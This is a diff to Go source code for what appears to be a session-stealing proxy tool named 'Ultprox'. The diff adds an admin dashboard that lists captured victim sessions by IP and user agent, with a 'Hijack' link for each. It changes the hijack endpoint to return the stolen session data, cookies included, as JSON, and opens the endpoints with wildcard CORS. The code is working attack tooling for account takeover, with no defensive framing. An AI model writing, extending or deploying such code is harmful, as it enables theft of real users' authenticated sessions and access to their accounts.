@@ -506,36 +506,97 @@ func writeLog(data string) {
 /* Admin Panel */
 
 func startAdminPanel() {
-	http.HandleFunc("/sessions", listSessionsHandler)
-	http.HandleFunc("/hijack", hijackSessionHandler)
-	
-	log.Printf("Admin panel running on http://localhost%s", adminPort)
-	log.Fatal(http.ListenAndServe(adminPort, nil))
+    http.HandleFunc("/", adminUIHandler)
+    http.HandleFunc("/sessions", enableCORS(listSessionsHandler))
+    http.HandleFunc("/hijack", enableCORS(hijackSessionHandler))
+    
+    log.Printf("Admin panel running on http://localhost%s", adminPort)
+    log.Fatal(http.ListenAndServe(adminPort, nil))
+}
+// Enable CORS middleware
+func enableCORS(next http.HandlerFunc) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        w.Header().Set("Access-Control-Allow-Origin", "*")
+        w.Header().Set("Access-Control-Allow-Methods", "GET")
+        next(w, r)
+    }
 }
 
 func listSessionsHandler(w http.ResponseWriter, r *http.Request) {
-	sessions, err := sessionManager.GetAll(context.Background())
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		return
-	}
-	json.NewEncoder(w).Encode(sessions)
+    w.Header().Set("Content-Type", "application/json")
+    sessions, err := sessionManager.GetAll(context.Background())
+    if err != nil {
+        http.Error(w, err.Error(), http.StatusInternalServerError)
+        return
+    }
+    json.NewEncoder(w).Encode(sessions)
 }
 
-func hijackSessionHandler(w http.ResponseWriter, r *http.Request) {
-	sessionID := r.URL.Query().Get("id")
-	session, err := sessionManager.GetByID(context.Background(), sessionID)
-	if err != nil {
-		http.Error(w, "Session not found", http.StatusNotFound)
-		return
-	}
+func adminUIHandler(w http.ResponseWriter, r *http.Request) {
+    w.Header().Set("Content-Type", "text/html")
+    fmt.Fprintf(w, `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Ultprox Admin</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 20px; }
+            table { border-collapse: collapse; width: 100%; }
+            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+            th { background-color: #f2f2f2; }
+            tr:nth-child(even) { background-color: #f9f9f9; }
+        </style>
+    </head>
+    <body>
+        <h1>Active Sessions</h1>
+        <div id="sessions"></div>
+        
+        <script>
+            async function loadSessions() {
+                try {
+                    const response = await fetch('/sessions');
+                    const sessions = await response.json();
+                    
+                    let html = '<table><tr><th>ID</th><th>IP</th><th>User Agent</th><th>Last Active</th><th>Actions</th></tr>';
+                    
+                    for (const id in sessions) {
+                        const s = sessions[id];
+                        html += \`
+                        <tr>
+                            <td>\${s.id}</td>
+                            <td>\${s.ip}</td>
+                            <td>\${s.user_agent}</td>
+                            <td>\${new Date(s.last_active).toLocaleString()}</td>
+                            <td><a href="/hijack?id=\${s.id}" target="_blank">Hijack</a></td>
+                        </tr>\`;
+                    }
+                    
+                    html += '</table>';
+                    document.getElementById('sessions').innerHTML = html;
+                } catch (error) {
+                    console.error('Error loading sessions:', error);
+                }
+            }
+            
+            // Load immediately and every 5 seconds
+            loadSessions();
+            setInterval(loadSessions, 5000);
+        </script>
+    </body>
+    </html>
+    `)
+}
 
-	http.SetCookie(w, &http.Cookie{
-		Name:    "session_token",
-		Value:   session.Cookies,
-		Expires: time.Now().Add(1 * time.Hour),
-	})
-	fmt.Fprintf(w, "Session hijacked successfully")
+// Updated hijackSessionHandler
+func hijackSessionHandler(w http.ResponseWriter, r *http.Request) {
+    w.Header().Set("Content-Type", "application/json")
+    sessionID := r.URL.Query().Get("id")
+    session, err := sessionManager.GetByID(context.Background(), sessionID)
+    if err != nil {
+        http.Error(w, `{"error":"session not found"}`, http.StatusNotFound)
+        return
+    }
+    json.NewEncoder(w).Encode(session)
 }
 
 /* Cleanup */
